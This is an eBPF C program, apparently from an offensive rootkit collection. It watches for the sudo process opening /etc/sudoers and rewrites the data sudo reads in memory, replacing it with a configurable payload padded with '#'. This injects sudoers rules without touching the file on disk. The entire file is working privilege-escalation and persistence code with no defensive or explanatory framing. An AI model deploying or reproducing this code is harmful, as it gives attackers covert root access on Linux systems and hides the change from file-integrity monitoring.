// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define MAX_PAYLOAD_LEN 100
#define SUDOERSLEN 13
char LICENSE[] SEC("license") = "Dual BSD/GPL";


struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, __u32);
} fdMap SEC(".maps");

struct{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, __u64);
} bufMap SEC(".maps");

struct event {
    u32 pid;
    u8 comm[TASK_COMM_LEN];
    bool success;
};
const struct event *unused __attribute__((unused));

const volatile int target_ppid = 0;
// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;
const volatile int payload_len = 0;
const volatile char payload[MAX_PAYLOAD_LEN];
//int openat(int dirfd, const char *pathname, int flags);
//int openat(int dirfd, const char *pathname, int flags, mode_t mode);
SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx){
    u64 pid_tgid = bpf_get_current_pid_tgid();
    if (target_ppid!=0){
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        pid_t ppid = BPF_CORE_READ(task,real_parent,tgid);
        if (target_ppid!=ppid){
            //bpf_printk("target_ppid:%d",target_ppid);
            //bpf_printk("ppid:%d",ppid);
            return 0;
        }
    }

    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm,sizeof(comm));
    char sudo[] = "sudo";
    int sudoLen = 5;
    //if current id sudo
    for (int i = 0; i < sudoLen; ++i) {
        if(sudo[i]!=comm[i]){
            return 0;
        }
    }
    char pathname[SUDOERSLEN];
    char *p = (char *)BPF_CORE_READ(ctx,args[1]);
    bpf_probe_read_user_str(&pathname,SUDOERSLEN,p);
    char sudoers[] = "/etc/sudoers";
    for (int i = 0; i < SUDOERSLEN; ++i) {
        if(sudoers[i]!=pathname[i]){
            return 0;
        }
    }
    bpf_printk("Command %s\n", comm);
    bpf_printk("Pathname %s\n", pathname);
    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            bpf_printk("no uid");
            return 0;
        }
    }
    //store fdMap
    u32 zero = 0;
    bpf_map_update_elem(&fdMap,&pid_tgid,&zero,BPF_ANY);
    return 0;
}


SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx){
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32* check = (u32*)bpf_map_lookup_elem(&fdMap,&pid_tgid);
    if (check==0){
        return 0;
    }
    u32 fd = BPF_CORE_READ(ctx,ret);
    bpf_map_update_elem(&fdMap,&pid_tgid,&fd,BPF_ANY);
    return 0;
}

//ssize_t read(int fd, void *buf, size_t count);
SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx){
    u64 pid_tgid = bpf_get_current_pid_tgid();
    //check if pid_tgid in fdMap
    u32* fdPtr = (u32*)bpf_map_lookup_elem(&fdMap,&pid_tgid);
    if (fdPtr==0){
        return 0;
    }
    u32 currentFd = BPF_CORE_READ(ctx,args[0]);
    //check if current fd is the same as the fd in fdMap
    u32 mapFd = *fdPtr;
    if(currentFd!=mapFd){
        return 0;
    }
    u64 bufAddr = BPF_CORE_READ(ctx,args[1]);

    bpf_map_update_elem(&bufMap,&pid_tgid,&bufAddr,BPF_ANY);

    //size_t buff_size = BPF_CORE_READ(ctx,args[2]);
    //bpf_printk("buff_size:%d",buff_size);
    return 0;
}




SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx){


    u64 pid_tgid = bpf_get_current_pid_tgid();
    pid_t pid = pid_tgid>>32;
    u64* bufAddrPtr = (u64*)bpf_map_lookup_elem(&bufMap,&pid_tgid);
    if (bufAddrPtr==0){
        return 0;
    }
    u64 bufAddr = *bufAddrPtr;
    if (bufAddr<=0){
        return 0;
    }
    ssize_t count = BPF_CORE_READ(ctx,ret);
    if (count<=0){
        return 0;
    }
    if (count<payload_len){
        return 0;
    }
    char buf[MAX_PAYLOAD_LEN]={ 0x00 };
    bpf_probe_read_user_str(&buf,MAX_PAYLOAD_LEN,(void*)bufAddr);
    //
    for (int i = 0; i < MAX_PAYLOAD_LEN; ++i) {
        if (i >= payload_len) {
            buf[i] = '#';
        }
        else {
            buf[i] = payload[i];
        }
    }
    long ret = bpf_probe_write_user((void *)bufAddr, &buf, sizeof(buf));
    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    return 0;


}


SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx){
    // Check if we're a process thread of interest
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32* check = bpf_map_lookup_elem(&fdMap, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&fdMap, &pid_tgid);
    bpf_map_delete_elem(&bufMap, &pid_tgid);

    return 0;

}



